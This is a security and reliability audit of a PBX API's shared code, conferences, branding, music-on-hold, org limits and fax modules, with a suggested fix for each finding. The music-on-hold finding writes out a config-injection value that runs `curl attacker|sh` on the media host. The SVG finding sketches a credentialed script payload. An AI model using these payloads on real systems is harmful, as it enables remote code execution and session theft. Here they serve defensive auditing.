# Audit — AREA `api-pbx-1`

Scope: `apps/api/src/pbx` subdirectories a–o inclusive plus `shared/` plus `pbx.module.ts`.

Owned subdirs (from `ls apps/api/src/pbx`): `audit-log`, `branding-logo`, `call-block`, `call-flows`,
`calls`, `carrier`, `conferences`, `dial-plan`, `emergency-addresses`, `extensions`, `fax`,
`feature-codes`, `inbound-routes`, `ivr-menus`, `media`, `moh-classes`, `org-limits`, `org-settings`,
`outbound-routes`, plus `shared/` and `pbx.module.ts`.
Not audited (owned by the p–z auditor): `paging-groups`, `park-lots`, `phone-numbers`, `phrases`,
`pin-sets`, `prompts`, `queues`, `reseller-usage`, `ring-groups`, `routing`, `security`,
`shared-lines`, `sip-credentials`, `time-conditions`, `translations`, `trunks`, `voicemail-boxes`,
`webhooks`, `pbx-bootstrap.ts`, `pbx-cdr-ports.module.ts`.

Tests read for intent: `apps/api/test/pbx/*` (auditLog, auditLogQuery, projectionOutbox,
pbxResourceService, pbxErrors, pbxDto, pbxDestinationSites, conferenceModeration, selfServiceScope,
orgSettings, brandingLogo, callBlock, fax, callsOriginate, emergencyNotification, extensionUsers,
extensionFeatureRpc, musicOnHoldConf, adminBlock), plus
`apps/api/test/auth/permissionEnforcement.test.ts`.

---

## P0

### [P0] `PUT …/reorder` violates the unique `(parent, ordinal)` index on 7 of the 8 reorderable collections (confidence: high)

- Where: `apps/api/src/pbx/shared/pbx.repository.ts:996-1001`
- Code:
  ```ts
  for (const [index, id] of ids.entries()) {
  	await transaction
  		.update(resource.table)
  		.set({ [columnKey(ordinalColumn)]: index } as never)
  		.where(and(eq(rowId(resource), id), eq(resource.parentColumn, parentId)));
  }
  ```
- Problem: ordinals are rewritten to `0…n-1` **one row per statement**. Every collection that has a
  `PUT …/reorder` except IVR options carries a **non-deferrable UNIQUE index** on
  `(parent_id, ordinal)`:
  - `packages/pbx-db/src/schema/time-conditions-schema.ts:130` `time_condition_rule_condition_ordinal_key`
  - `.../ring-groups-schema.ts:79` `ring_group_destination_group_ordinal_key`
  - `.../paging-schema.ts:104` `paging_group_member_group_ordinal_key`
  - `.../shared-lines-schema.ts:122` `shared_line_appearance_line_ordinal_key`
  - `.../pins-schema.ts:118` `pin_set_entry_set_ordinal_key`
  - `.../phrases-schema.ts:58` `phrase_step_phrase_ordinal_key`
  - `.../translations-schema.ts:109` `translation_rule_ruleset_ordinal_key`

  Only `ivr-schema.ts:97` uses a plain `index("ivr_menu_option_menu_ordinal_idx")`, which is why the
  one collection anybody is likely to have exercised by hand works. `grep -ri deferrable
packages/pbx-db/` returns nothing, and Drizzle's `uniqueIndex()` emits `CREATE UNIQUE INDEX`, which
  **cannot** be deferred — the constraint is enforced at the end of every statement, not at COMMIT.

- Failure scenario: the simplest real reorder — swapping the first two rules of a time condition —
  issues `UPDATE … SET ordinal = 0 WHERE id = <B>` while row A still holds `ordinal = 0`. Postgres
  raises `23505`, `toPbxFailure` maps it to `PbxConflictFailure`, and the caller gets a **409
  "Another time-condition-rule in this organization already uses that value"** for a request that is
  a pure permutation of rows the server itself just validated with `assertPermutation`. The write
  rolls back, so reordering is simply impossible on those seven collections. There is no test for
  reorder anywhere under `apps/api/test/pbx`, which is why this is unnoticed.
- Fix (surgical, two passes in the same transaction):
  ```ts
  // pass 1 — park every row in the collection outside the final range so no pair collides
  for (const [index, id] of ids.entries()) {
      await transaction.update(resource.table)
          .set({ [columnKey(ordinalColumn)]: -(index + 1) } as never)
          .where(and(eq(rowId(resource), id), eq(resource.parentColumn, parentId)));
  }
  // pass 2 — land the final ordinals
  for (const [index, id] of ids.entries()) { …set(index)… }
  ```
  Requires the ordinal column to accept negatives; if any of the seven has a `CHECK (ordinal >= 0)`,
  use `ordinal + 1_000_000` as the parking offset instead. Alternatively make the seven indexes
  `UNIQUE … DEFERRABLE INITIALLY DEFERRED` in `pbx-db` — but that is a migration on seven tables,
  where the two-pass fix is nine lines in one file.
- Cross-area: the _diagnosis_ spans `packages/pbx-db/src/schema/*`, but the fix above is entirely
  inside `shared/pbx.repository.ts`. The endpoints that are broken live in the p–z auditor's
  subdirs (`ring-groups`, `time-conditions`, `phrases`, `pin-sets`, `translations`, `shared-lines`,
  `paging-groups`) — they need no change, they just start working. Worth a regression test.

### [P0] Conference moderation abandons the fan-out on the first unreachable engine, contradicting the client's own contract (confidence: high)

- Where: `apps/api/src/pbx/conferences/conference-moderation.service.ts:138-149` together with
  `apps/api/src/pbx/conferences/conference-control.client.ts:213-229`
- Code — the walk:
  ```ts
  const answer = await this.control.send(instanceId, request);
  if (answer.ok) {
  	return answer;
  }
  last = answer;
  if (answer.reason === "unknown-conference" || answer.reason === "unknown-member") {
  	continue;
  }
  break; // "A real refusal from the instance that owns the member. Stop."
  ```
  Code — what an unreachable engine produces:
  ```ts
  private refuse(instanceId, request, error): ConferenceControlResponse {
      return { ok: false, …, reason: "internal", error: error.slice(0, 512) };
  }
  ```
- Problem: `send()` converts _every_ transport failure — no responders, request timeout, closed
  connection, a reply that fails the schema — into `reason: "internal"`. `ask()` treats anything that
  is not `unknown-conference`/`unknown-member` as an authoritative refusal and **breaks out of the
  loop**. So a dead or wedged instance is read as "the instance that owns the member said no".
  This directly contradicts `send()`'s documented contract three files up:
  _"'no responders available' (the instance is gone) and a timeout (it is wedged) mean the same thing
  to them — that engine cannot answer, **try the next one**."_ `ask()` does not try the next one.
- Failure scenario: a room spans engines `eng-a` and `eng-b`; the member being kicked is on `eng-b`;
  `eng-a` is mid-restart. `contributors()` sorts deterministically, so `eng-a` is always asked first,
  always returns `internal`, and the walk stops. Every mute/kick/lock on that room returns 503
  `ConferenceControlUnavailableException` for as long as `eng-a` is down, even though the engine that
  can serve the command is healthy and one hop away. The deterministic sort turns an intermittent
  fault into a permanent one for that room.
- Fix: continue past a transport-level refusal, and distinguish it from an engine-authored one. Either
  give `refuse()` a distinct reason (e.g. `unreachable`) and add it to the `continue` set in `ask()`,
  or — smaller — add a flag to the refusal:
  ```ts
  // conference-control.client.ts refuse(): mark locally-synthesised refusals
  return { ok: false, …, reason: "internal", error: `unreachable: ${error.slice(0, 500)}` };
  // conference-moderation.service.ts ask():
  if (answer.reason === "unknown-conference" || answer.reason === "unknown-member" ||
      answer.error?.startsWith("unreachable:") === true) { continue; }
  ```
  The reason-code version is cleaner and is what I would ask for.
- Cross-area: adding a new `reason` value touches
  `packages/events/schemas` (`conferenceControlResponseSchema`) and, if the engine is expected to
  echo it, `apps/engine`. The `error`-prefix variant is confined to these two files.

---

## P1

### [P1] A delete issues 21+ sequential round trips inside the open write transaction (confidence: high)

- Where: `apps/api/src/pbx/shared/destinations.ts:236-268`, called from
  `apps/api/src/pbx/shared/pbx.repository.ts:363-393`
- Code:
  ```ts
  for (const site of DESTINATION_SITES) {           // 21 entries
      …
      const rows = await transaction.execute(sql`select id::text as id, … limit 25`);
  }
  ```
- Problem: `DESTINATION_SITES` has 21 entries and each one is its own awaited `execute` on the open
  transaction; `findScalarReferences` adds one more per declared site, and the trunk / park-lot /
  paging-group jsonb scans add up to three more. Every `DELETE /api/v1/<anything with a
destinationType>/:id` therefore pays 21–26 serial network round trips _while holding a write
  transaction open_, before it has deleted anything. The file's own comment argues the cost away
  ("fourteen small index-backed reads … cost less than the readability of the alternative") but the
  list has since grown to twenty-one and the comment was not updated.
- Cost: at a 1 ms round trip that is ~25 ms of pure latency per delete, all of it inside a transaction
  that is holding row locks; on a cross-AZ database at 5 ms it is ~125 ms. Bulk cleanup of a hundred
  rows is 2.5 s of round trips that are structurally parallelisable.
- Fix: the scans are independent reads with no ordering dependency between them. Either build one
  `UNION ALL` over the sites (they already share the `(id, name)` projection, so the per-site casting
  the comment worries about is already written), or — minimally — run them concurrently:
  ```ts
  const perSite = await Promise.all(
      DESTINATION_SITES.filter((s) => s.table !== options.excludeTable).map(async (site) => { … }),
  );
  return perSite.flat();
  ```
  Note `postgres-js` serialises statements on a single transaction connection, so `Promise.all` only
  removes the per-statement await overhead, not the serialisation — the `UNION ALL` is the fix that
  actually collapses this to one round trip and is what I would ask for.
- Cross-area: none — `DESTINATION_SITES` and both helpers live in this file.

### [P1] Child collections are read and returned entirely unbounded (confidence: medium)

- Where: `apps/api/src/pbx/shared/pbx.repository.ts:792-811`, `apps/api/src/pbx/shared/pbx-resource.service.ts:213-222`
- Code:
  ```ts
  return (await transaction.select().from(resource.table)
      .where(eq(resource.parentColumn, parentId))
      .orderBy(...)) as Record<string, unknown>[];   // no .limit()
  ```
- Problem: `PbxChildResourceService` documents the choice — _"Children are not paginated: an IVR menu
  with more than a screenful of options is a design problem, not a paging problem"_ — and for IVR
  options that is defensible. It is applied uniformly, though, and the same code path serves
  collections whose size is genuinely tenant-controlled and can be large (`pin_set_entry`,
  `paging_group_member`, `shared_line_appearance`, `queue_agent`). `reorderChildren` reads the whole
  collection twice more (`pbx.repository.ts:982` and `:1003`) with no bound either, and `reorderDto`
  already admits up to 500 ids.
- Cost: a tenant with a 20 000-entry PIN set turns one `GET` into a 20 000-row select serialised into
  a single JSON body, and each `PUT …/reorder` into three such scans plus N update statements.
  Contradicts the area's own stated invariant, oikos §4 "never unbounded", which `shared/pagination.ts`
  opens with.
- Fix: add a hard ceiling to `listChildren` — `.limit(MAX_CHILDREN)` with `MAX_CHILDREN = 1000` — and
  either page the collections that can exceed it or make exceeding it a `PbxValidationFailure` that
  names the collection. At minimum, bound the two reads in `reorderChildren` to `reorderDto`'s own
  500 so the endpoint cannot be used to scan an arbitrarily large table.
- Cross-area: the endpoints affected are largely in the p–z auditor's subdirs; the fix is in `shared/`.

### [P1] The outbox sweeper does not wait for an in-flight sweep at shutdown (confidence: medium)

- Where: `apps/api/src/pbx/shared/projection-outbox.service.ts:147-153`
- Code:
  ```ts
  onApplicationShutdown(): void {
      this.stopped = true;
      if (this.timer !== undefined) { clearInterval(this.timer); this.timer = undefined; }
  }
  ```
- Problem: `onApplicationShutdown` is synchronous and returns immediately. A sweep already inside
  `runOnce()` keeps publishing and keeps issuing `dischargeRows` / `recordAttempt` against
  `this.database.adminDb`, while `PbxModule.onApplicationShutdown` (`pbx.module.ts:891-893`) closes
  the pool. `this.stopped` is only re-checked at the _top_ of each group iteration
  (`projection-outbox.service.ts:190`), so the publish and the two writes for the current group run
  regardless.
- Failure scenario: shutdown lands mid-group. The `dischargeRows` update rejects against a closing
  pool; it is inside `runOnce`'s `try`, so it becomes the `catch` at `:232`, which then calls
  `recordAttempt` — also against the closing pool — and _that_ rejection propagates out of `runOnce`
  into `sweep()`'s catch. Nothing crashes, but the group is left pending with no attempt recorded and
  a confusing error in the shutdown logs. Worse, if `pruneDischarged` at `:252` is the statement in
  flight, an unhandled rejection can escape via the `void this.sweep()` in the interval callback.
- Fix: make it async and await the in-flight pass:
  ```ts
  private inFlight: Promise<unknown> | undefined;
  async sweep() { … this.inFlight = this.runOnce(); return await this.inFlight; … }
  async onApplicationShutdown(): Promise<void> {
      this.stopped = true;
      if (this.timer !== undefined) { clearInterval(this.timer); this.timer = undefined; }
      await this.inFlight?.catch(() => undefined);
  }
  ```
  Nest awaits an async `onApplicationShutdown`, and module teardown order means this runs before the
  pool closes.
- Cross-area: none.

---

## P2

### [P2] `PbxDatabaseFailure` puts the raw Postgres error message in the 503 response body (confidence: high)

- Where: `apps/api/src/pbx/shared/pbx.errors.ts:246-252` and `:388-391`
- Code:
  ```ts
  return new PbxDatabaseFailure({ operation: `${kind}.${operation}`, detail: error?.message ?? String(cause) });
  // …
  message: `The telephony database refused "${this.operation}": ${this.detail}`,
  ```
- Problem: every SQLSTATE that is not `23505` or `23514` reaches the client verbatim. Postgres error
  messages routinely carry table names, column names, constraint names, the failing literal, and for
  `22P02` the offending value; a connection failure carries the host and port. This is the fallback
  path, so it fires for exactly the cases nobody anticipated. Every other failure in this file is
  careful about disclosure — `PLATFORM_WIDE_CONSTRAINTS` exists specifically so a cross-tenant unique
  violation says nothing about the other tenant — and this one undoes that care by default.
- Fix: log `detail` at error with the operation, and return a generic body plus a correlation id:
  `message: \`The telephony database refused "${this.operation}".\``The`runEffect` opaque-`err_…`
  convention the repository header describes is already the pattern for this.
- Cross-area: none.

### [P2] `resource_ref` bypasses the `asUuid` guard its own documentation says it goes through (confidence: high)

- Where: `apps/api/src/pbx/shared/audit-log.ts:107-109` (the doc) vs `:293-307` (the insert)
- Code — the claim:
  ```ts
  // `actor_user_id`, `resource_ref` and `request_id` are native `uuid` columns … Every id that
  // reaches a uuid column is therefore checked here first
  ```
  Code — the insert:
  ```ts
  resourceRef: entry.resourceRef,   // raw; actorUserId and requestId do go through asUuid
  ```
- Problem: `resourceRef` is the one of the three that is passed through unchecked.
  `RecordingPurgeAuditService` (`shared/recording-purge-audit.service.ts`) does call `asUuid` itself,
  but the repository does not — `pbx.repository.ts:695` passes `String(created.id ?? row.id)` and
  `:741`/`:1019` pass the raw path parameter. Today every one of those is guarded upstream (a
  `ParseUUIDPipe` on the controller plus a successful `requireRow`/`requireParent`), so this is not
  currently exploitable — which is exactly why it will be missed when a new write path is threaded
  through. The stated invariant is that the guard is here, and it is not.
- Failure scenario: a future caller with a non-uuid resource ref raises `22P02` _inside the
  mutation's transaction_, rolling back the user's write — the precise outcome the `asUuid` comment
  exists to prevent, delivered as a 503.
- Fix: `resourceRef: asUuid(entry.resourceRef)` in `insertAuditLog`, matching the two columns beside
  it. `RecordingPurgeAuditService`'s own call then becomes redundant but harmless.
- Cross-area: none.

### [P2] Stale headers claim endpoints that now exist do not (confidence: high)

- Where: `apps/api/src/pbx/conferences/conferences.resource.ts:15-17` and `:29-32`
- Code:
  ```
  * body. Until that endpoint exists, `requiresPin` in the compiled artifact stays false — recorded
  * as a follow-up rather than papered over with a plaintext column.
  …
  * Both columns are NULL today (no endpoint writes them yet), so this
  * is a rule established before there is anything to leak rather than after.
  ```
- Problem: `ConferencePinService` (`conferences/conference-pin.service.ts`) is that endpoint — it
  ships, it is wired in `pbx.module.ts:784`, it is reachable at `POST/DELETE /conferences/:id/pin`
  and `/moderator-pin`, and it writes both columns. `conference-pin.service.ts:50-54` even documents
  the corrected behaviour ("setting a participant PIN through this service DOES change the compiled
  artifact"). A reader who trusts the resource file will conclude `requiresPin` is always false and
  that `secretColumns` is speculative, when it is now load-bearing.
- Fix: delete the two "until that endpoint exists" clauses and point at `conference-pin.service.ts`.
- Cross-area: none.

### [P2] `.own` ownership resolution opens two transactions where one would do (confidence: high)

- Where: `apps/api/src/pbx/shared/self-ownership.ts:49-65` and `:68-84`
- Code:
  ```ts
  const extensionIds = await ownedExtensionIds(database, organizationId, userId);   // txn 1
  if (extensionIds.length === 0) { return []; }
  return await database.withTenantScope(organizationId, async (transaction) => {    // txn 2
  ```
- Problem: `ownedVoicemailBoxIds` and `ownedDeviceIds` each take a connection, set the tenant role
  and the org GUC, run one select, commit, and then do the whole thing again. Two pool checkouts and
  two `set local role` round trips per `.own` request, on a path that runs on every list and every
  single-row read for a self-service user. The two reads are also not a consistent snapshot, though
  nothing depends on that today.
- Fix: one `withTenantScope` with both selects inside it, or a single join —
  `select vb.id from voicemail_box vb join extension_user eu on eu.extension_id = vb.extension_id
where eu.user_id = $1`, which is one statement and lets RLS do the tenant filtering exactly as now.
- Cross-area: none — the callers are in the p–z auditor's subdirs but the signatures do not change.

### [P2] `assertNotReferenced`'s header undercounts the sites it scans (confidence: high)

- Where: `apps/api/src/pbx/shared/destinations.ts:233-235`
- Code: `* One statement per site rather than a hand-rolled \`union all\`: fourteen small index-backed reads`
- Problem: `DESTINATION_SITES` has twenty-one entries, not fourteen — the T2 admin block added seven
  and the comment was not updated. It is the comment that carries the cost argument for the P1 above,
  so the number being 50 % low is what has kept that argument looking sound.
- Fix: state the count as `DESTINATION_SITES.length` in prose, or drop the number.
- Cross-area: none.

---

---

# Slice findings

## `branding-logo` / `media` / `moh-classes` / `org-limits` / `org-settings`

### [P0] `branding.logoObjectKey` is caller-supplied — the public logo route becomes an unauthenticated read of ANY object in the shared media store (confidence: high)

- Where: `apps/api/src/auth/branding/branding.dto.ts:26` (write), `apps/api/src/pbx/branding-logo/branding-logo.controller.ts:96-123` (read)
- Code:
  ```ts
  logoObjectKey: z.string().trim().min(1).max(512).nullable().optional(),  // branding.dto.ts:26
  const objectKey = branding.logoObjectKey;                                // controller:96
  const stat = await this.store.head(objectKey);                           // controller:105
  ```
- Problem: `PATCH /api/v1/branding` (permission `branding.write`, an ordinary tenant admin) writes an
  arbitrary string into `logoObjectKey`. `GET /api/v1/branding/logo` is `@PublicRoute()` and streams
  whatever that key names, with `Range` support, out of `PBX_MEDIA_STORE`. Per
  `media/media-storage.ts:17-23` that store is the _single_ object root that also holds
  `apps/engine`'s call recordings and voicemail messages plus every tenant's `prompts/`, `greetings/`,
  `moh/`. `resolveObjectPath` proves containment inside the root only — it does not scope to a tenant.
- Failure scenario: tenant A's admin sets `logoObjectKey = "recordings/<orgB-uuid>/<recording>.wav"`,
  then fetches `GET /api/v1/branding/logo?host=<tenant-A-domain>` **with no session at all** and
  byte-ranges out another tenant's call recording. `branding-logo-upload.service.ts:59` already
  namespaces the keys it mints; the controller header at :58-61 names this exact gap as "a follow-up",
  but the write path that makes it exploitable is live.
- Fix: enforce the namespace on read, immediately after controller line 96 —
  `if (!objectKey.startsWith(\`${BRANDING_LOGO_KEY_PREFIX}/\`)) throw new NotFoundException(…)`— and
additionally drop`logoObjectKey`from`updateBrandingDto`so the key can only be minted by`BrandingLogoUploadService`.
- Cross-area: the DTO is in `apps/api/src/auth/branding`; the objects exposed belong to the CDR and
  voicemail namespaces. No schema change.

### [P0] `moh_class.streamUri` is unvalidated free text rendered into `musiconhold.conf` — config injection → RCE on the Asterisk host (confidence: high)

- Where: `apps/api/src/pbx/media/musiconhold-conf.ts:236`; input at `apps/api/src/pbx/moh-classes/moh-classes.dto.ts:40`
- Code:
  ```ts
  streamUri: z.string().trim().max(512).nullish(),   // moh-classes.dto.ts:40 — no charset rule
  `; source ${uri}`,                                  // musiconhold-conf.ts:236
  ```
- Problem: `name` is regex-constrained (`moh-classes.dto.ts:24`) precisely because "a section name with
  a `]` or a newline in it is a configuration file that does not parse". `streamUri`, which lands on an
  adjacent line of the same generated file, has no such constraint; `trim()` only strips the ends.
- Failure scenario: a `settings.write` holder creates a stream class with
  `streamUri = "http://x\napplication=/bin/sh -c 'curl attacker|sh'"`. The generator
  (`scripts/generate-musiconhold.ts`) emits a section whose comment line is broken by the newline and
  whose next line is an attacker-chosen `application=`. `res_musiconhold` executes `application=` as a
  child process on the media server at the next hold — remote command execution on the Asterisk host
  from a tenant-scoped permission. `]`/`[` additionally let it forge or hijack another section,
  including `[default]`.
- Fix: constrain at the DTO —
  `streamUri: z.url().max(512).refine((v) => /^https?:\/\//u.test(v) && !/[\r\n]/u.test(v)).nullish()`
  — and, defensively, have `renderMusicOnHoldConf` skip any row containing `\r`/`\n` with a new
  `reason`: the renderer must not depend on the DTO having run, since it also reads rows written
  before the constraint existed (its own :161-162 acknowledges such rows).
- Cross-area: `scripts/generate-musiconhold.ts` consumes the render;
  `test/pbx/musicOnHoldConf.test.ts` has no adversarial URI case.

### [P0] Uploaded SVG logos are served inline from a public navigable URL with no CSP or `nosniff` — stored XSS on the API origin (confidence: high)

- Where: `apps/api/src/pbx/branding-logo/branding-image.ts:183-184`, `apps/api/src/pbx/branding-logo/branding-logo.controller.ts:118-121`
- Code:
  ```ts
  if (looksLikeSvg(head)) return { kind: "svg", extension: "svg", contentType: "image/svg+xml" };
  contentType: imageContentType(objectKey), disposition: "inline",
  ```
- Problem: `branding-image.ts:20-26` argues SVG is safe because "the logo is consumed as an IMAGE
  SOURCE … a browser does not execute script embedded in an SVG loaded that way". That premise does
  not hold for the route that serves it: `GET /api/v1/branding/logo?host=…` is a plain, public,
  GET-navigable URL returning `image/svg+xml` with `Content-Disposition: inline`. Navigating to it
  renders the SVG as a _document_, and `<script>` inside it executes. There is no helmet, no
  `Content-Security-Policy` and no `X-Content-Type-Options` anywhere in `apps/api/src`;
  `media/media-response.ts:82-86` sets only content-type/disposition/length/accept-ranges. SVG content
  is not sniffed beyond `<svg` appearing in the first 64 bytes.
- Failure scenario: a `branding.write` admin uploads an SVG containing
  `<script>fetch('/api/v1/…',{credentials:'include'})…</script>`. Any link to the logo URL executes
  script on the API origin — the origin the session cookie is scoped to — from an unauthenticated
  endpoint, so the link can be sent to anyone.
- Fix: on every logo response set `Content-Security-Policy: default-src 'none'; style-src
'unsafe-inline'; sandbox` and `X-Content-Type-Options: nosniff`; or serve `disposition:
"attachment"` for `.svg`. Also correct the now-false safety note at `branding-image.ts:20-26`.
- Cross-area: the same missing headers apply to every route through `media/media-response.ts`
  (prompts, greetings, recordings) — a global header hook beats a per-route fix.

### [P0] `maxStorageMb` is documented as enforced and is enforced nowhere; the counting helper makes it a structural no-op (confidence: high)

- Where: `apps/api/src/pbx/org-limits/org-limits.service.ts:151-154`; the claim at `apps/api/src/pbx/org-limits/org-limits.ts:30-31`
- Code:
  ```ts
  // org-limits.ts:30 — "`maxStorageMb` is enforced at upload for the same reason the counts are"
  private async countFor(organizationId: string, limit: OrgLimitName): Promise<number> {
      if (limit !== "maxExtensions" && limit !== "maxTrunks") { return 0; }
  ```
- Problem: `assertMayCreate` is called from exactly two places (`extensions.service.ts:94`,
  `trunks.service.ts:31`). No upload path — prompts, greetings, MOH, branding — consults the quota.
  And even if one did, `countFor` returns `0` for `maxStorageMb`, so `assertWithinLimit` compares
  `0 >= ceiling` and never refuses. A tenant with `maxStorageMb: 100` can upload without bound.
  (`org-limits.ts:9-10`'s "enforced at CREATE, in the same transaction as the insert" also contradicts
  `org-limits.service.ts:20-34`, which correctly describes a read-then-create; the service comment is
  the honest one.)
- Fix: have `PromptsService.upload` and the greeting/logo paths call a new
  `assertMayStore(session, incomingBytes)` that reads `limits.maxStorageMb` and compares
  `Math.floor((storageBytesFor(org) + incomingBytes) / 1_048_576)` against the ceiling. Until then,
  correct `org-limits.ts:30-31` to name the gap rather than assert enforcement.
- Cross-area: `pbx/prompts`, `pbx/voicemail-*`, `pbx/branding-logo` each gain a call.
  `routing/snapshot-loader.ts:759` already documents `maxStorageMb` as control-plane-only.

### [P1] A `stream` MOH class never receives its URI — the generated section decodes empty stdin and plays silence (confidence: high)

- Where: `apps/api/src/pbx/media/musiconhold-conf.ts:230-237`
- Code:
  ```ts
  "mode=custom",
  `application=/usr/bin/mpg123 -q -s --rate ${row.sampleRateHz} --mono -`,
  `; source ${uri}`,
  ```
- Problem: the trailing `-` makes `mpg123` read from **stdin**, which nothing writes to; the actual
  `uri` appears only inside a `;` comment. `mpg123` exits immediately and the class serves silence —
  the exact failure the file header (:11-16) says it exists to eliminate, and the same class of bug
  the `no-files` and `stream-without-uri` skips guard against.
  `test/pbx/musicOnHoldConf.test.ts:90-98` asserts only that `application=/usr/bin/mpg123` appears,
  so it passes on a broken command.
- Fix: pass the URI as the argument — `… --mono ${uri}` — **only after** the `streamUri` validation in
  the P0 above lands, since `application=` is a shell-executed command line.
- Cross-area: sequenced behind the `streamUri` injection fix.

### [P1] `storageBytesFor` streams every `prompt` and `voicemail_message` row into Node to sum a column (confidence: high)

- Where: `apps/api/src/pbx/org-limits/org-limits.service.ts:162-172`
- Code:
  ```ts
  transaction.select({ bytes: prompt.sizeBytes }).from(prompt),
  transaction.select({ bytes: voicemailMessage.sizeBytes }).from(voicemailMessage),
  const sum = (rows) => rows.reduce((total, row) => total + (row.bytes ?? 0), 0);
  ```
- Problem: an unbounded, unpaginated fetch of two whole tables per call to
  `GET /api/v1/org-limits/usage`. The class header (:40-47) argues "a sum over an indexed column is
  milliseconds" — but this is not that sum; it is a full row transfer summed in JS. A tenant with a
  large voicemail history makes the endpoint slow and memory-heavy exactly on the screen someone opens
  _because_ storage is large. It gets worse once the P0 above puts this on the upload path.
- Fix: push it into SQL —
  `select({ total: sql<number>\`coalesce(sum(${prompt.sizeBytes}),0)\` }).from(prompt)`and the same
for`voicemailMessage`, then add the two scalars.
- Cross-area: none.

### [P2] `patchOwnCategory` skips the per-category permission override every other settings write consults (confidence: medium)

- Where: `apps/api/src/pbx/org-settings/org-settings.service.ts:277-283`
- Code:
  ```ts
  const organizationId = this.organizationId(session);
  const userId = session.user.id;
  this.requireCatalogued(category); // no this.requireCategoryPermission(...)
  ```
- Problem: `patchCategory` (:119), `create` (:201), `update` (:218) and `remove` (:226) all re-check
  `CATEGORY_PERMISSIONS`; the `…/me` write does not. Not exploitable today — `USER_SCOPED_CATEGORIES`
  resolves to `["notifications"]` only and `CATEGORY_PERMISSIONS` only overrides `recordings` — so it
  is latent, not live. It becomes live the moment a setting in an overridden category is marked
  `scope: "user"`, and the class header at :261-263 asserts `settings.write.own` "is the floor" as
  though the override applied.
- Fix: add `this.requireCategoryPermission(session, category, "write");` after line 279.
- Cross-area: none.

## `fax` / `carrier`

### [P0] Outbound-fax webhook correlation throws instead of falling back, losing every terminal status when `client_state` is not a UUID (confidence: high)

- Where: `apps/api/src/pbx/fax/fax-inbound.service.ts:152`
- Code:
  ```ts
  const found =
  	(clientState === undefined
  		? undefined
  		: await findMessageOrgById(this.database.adminDb, clientState)) ??
  	(await findOutboundOrgByTelnyxId(this.database.adminDb, fax.fax_id));
  ```
- Problem: `??` only reaches the fallback when the left side _resolves_ to null/undefined.
  `findMessageOrgById` puts `clientState` into `where fax_message.id = $1`, a `uuid` column
  (`fax.repository.ts:564`). A non-UUID value makes Postgres raise `invalid input syntax for type
uuid`, the `await` rejects, and the fallback the comment one line up promises ("_then fall back to
  the carrier fax id_", :149) is never evaluated. The rejection unwinds to `handle()`'s catch (:63) →
  outcome `"error"`, 200 to Telnyx, and the row **never leaves `sending`** — no `delivered`, no
  `failed`, no `errorReason`. Telnyx does not redeliver a 200'd event, so the loss is permanent.
  Telnyx documents `client_state` as base64 and echoes it back encoded, in which case _every_ outbound
  fax loses its terminal status, silently (the row just sits in `sending`, which `claimNextSend` never
  reclaims because `markSent` nulls `claimed_at`).
- Fix:
  ```ts
  const byState =
  	clientState !== undefined && UUID_RE.test(clientState)
  		? await findMessageOrgById(this.database.adminDb, clientState)
  		: undefined;
  const found = byState ?? (await findOutboundOrgByTelnyxId(this.database.adminDb, fax.fax_id));
  ```
  (If the base64 theory holds, also try `Buffer.from(clientState, "base64").toString("utf8")` first.)
  `test/pbx/fax.test.ts:381` only ever passes a bare UUID `client_state`, which is why this is
  invisible; add a non-UUID case asserting the `telnyxFaxId` fallback still updates the row.
- Cross-area: none.

### [P0] Trunk re-provision rotates the live SIP password with no compensation, bricking the trunk if the local write fails (confidence: high)

- Where: `apps/api/src/pbx/carrier/carrier.service.ts:579` and `:587`
- Code:
  ```ts
  : await client.credentialConnections.update(existingConnectionId, { password, ... });
  const updated = await this.trunks.update(session, trunkId, { ... authUser: connection.user_name, ... });
  ```
- Problem: the class header (:46) states the rule — "_carrier first, database second, and
  **compensate** if the second half fails_" — and the order path honours it (`compensateRelease`,
  :393). This path does not. `credentialConnections.update` rotates the password on the _live_
  connection immediately (:561: "_A fresh password on every provision, including a re-provision_"). If
  `trunks.update` then throws — a validation refusal, a compile-on-write failure, a lost connection —
  control reaches the `catch` at :626, which only logs and rethrows. The carrier now holds a password
  nobody has: returned to no one, not in `pbx-db` by design (:65-70), and the trunk row still names
  the old credential. Every REGISTER fails and the trunk stops carrying calls until a re-provision
  happens to succeed. The first-provision branch has the milder version (an orphaned connection +
  profile at the carrier).
- Fix: move the local write ahead of the password rotation, or add a compensating step in the `catch`
  mirroring `compensateRelease` — retry `this.trunks.update` once and, failing that, log at error with
  `connectionId`, `userName` and an explicit "trunk credential rotated but not recorded —
  re-provision required".
- Cross-area: the "write local first" variant touches `TrunksService.update` ordering; the
  compensating-log variant is contained in `carrier.service.ts`.

### [P0] `retry_backoff_seconds` is never applied — a failing fax burns its whole retry budget in ~15 seconds (confidence: high)

- Where: `apps/api/src/pbx/fax/fax-send-worker.service.ts:166`; claim predicate at `fax/fax.repository.ts:444`
- Code:
  ```ts
  // "…it will be retried when its lease expires"
  await this.database.withTenantScope(
  	fax.organizationId,
  	async (transaction) => await releaseSend(transaction, fax.id),
  );
  ```
- Problem: `releaseSend` sets `status = 'queued', claimed_at = null` (`fax.repository.ts:495`), and
  `claimNextSend` treats _any_ `status = 'queued'` row as immediately claimable — the lease clause
  only gates rows still in `sending`. The row is eligible again on the next poll,
  `FAX_SEND_POLL_INTERVAL_MS` (default 5 s) later. The class header promises otherwise twice ("_the
  lease offers the row again after the server's backoff_", :36; "_The retry policy lives on the fax
  server_", :31), and `fax_server.retry_backoff_seconds` exists with a default of 60
  (`packages/pbx-db/src/schema/fax-schema.ts:99`), is exposed in both DTOs, is persisted, and is read
  by nothing anywhere in the repo.
- Failure scenario: the carrier is down for one minute; a queued fax attempts at t=0/5/10 s, exhausts
  `retryAttempts` (default 3) and is terminally `failed` ~50 s before the first backoff interval would
  have elapsed. Operator-visible symptom: faxes failing en masse during any brief carrier blip.
- Fix: have `releaseSend` stamp the next eligible time and have the claim respect it. Minimal version
  reusing the lease column — release _without_ clearing the claim and push `claimed_at` forward so the
  existing lease clause holds the row off:
  `.set({ status: "sending", claimedAt: new Date(Date.now() + backoffSeconds * 1000 - LEASE_MS), … })`.
  Cleaner: add `next_attempt_at` and `and (next_attempt_at is null or next_attempt_at <= now())` to
  both predicates in `claimNextSend`. Either way pass the server's `retryBackoffSeconds` — the worker
  already reads the server row for `retryAttempts` at :112, so it is one extra field, not a query.
- Cross-area: the `next_attempt_at` variant needs a migration in
  `packages/pbx-db/src/schema/fax-schema.ts`; the `claimed_at` variant is contained in `fax/`.

### [P1] Inbound fax media download is unbounded in memory (confidence: high)

